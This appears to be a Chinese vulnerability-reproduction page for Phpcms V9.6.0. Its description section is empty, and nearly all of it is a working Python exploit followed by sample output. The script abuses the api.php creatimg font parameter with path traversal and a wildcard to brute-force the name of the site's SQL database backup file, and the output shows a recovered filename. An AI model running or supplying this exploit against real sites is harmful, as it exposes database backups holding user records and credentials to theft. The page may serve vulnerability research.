Phpcms V9.6.0 数据库备份爆破
============================

一、漏洞简介
------------

二、漏洞影响
------------

Phpcms V9.6.0

三、复现过程
------------

    #!/usr/bin/env python
    # coding=utf-8
    '''/*
        * author = Mochazz
        * team   = 红日安全团队
        * env    = pyton3
        *
        */
    '''
    import requests
    import itertools
    characters = "abcdefghjklmnopqrstuvwxyz0123456789_!#"
    backup_sql = ""
    payload = "/api.php?op=creatimg&txt=mochazz&font=/../../../../caches/bakup/default/{location}<<"
    url = "http://www.0-sec.org"
    flag = 0
    for num in range(1, 7):
        if flag:
            break
        for pre in itertools.permutations(characters, num):
            pre = ''.join(list(pre))
            payload = payload.format(location=pre)
            r = requests.get(url+payload)
            if r.status_code == 200 and "PNG" in r.text:
                flag = 1
                backup_sql = pre
                payload = "/api.php?op=creatimg&txt=mochazz&font=/../../../../caches/bakup/default/{location}<<"
                break
            else:
                payload = "/api.php?op=creatimg&txt=mochazz&font=/../../../../caches/bakup/default/{location}<<"
    print("[+] 前缀为：", backup_sql)
    flag = 0
    for i in range(30):
        if flag:
            break
        for ch in characters:
            if ch == characters[-1]:
                flag = 1
                break
            payload = payload.format(location=backup_sql+ch)
            r = requests.get(url + payload)
            if r.status_code == 200 and "PNG" in r.text:
                backup_sql += ch
                print("[+] ", backup_sql)
                payload = "/api.php?op=creatimg&txt=mochazz&font=/../../../../caches/bakup/default/{location}<<"
                break
            else:
                payload = "/api.php?op=creatimg&txt=mochazz&font=/../../../../caches/bakup/default/{location}<<"

    print("备份sql文件地址为：", backup_sql+".sql")

结果为：

    C:\Users\dell\Desktop>python Zxc.py
    [+] 前缀为： 1
    [+]  12
    [+]  123
    [+]  1231
    [+]  12312
    [+]  123123
    [+]  1231231
    [+]  12312312
    [+]  123123123
    备份sql文件地址为： 123123123.sql
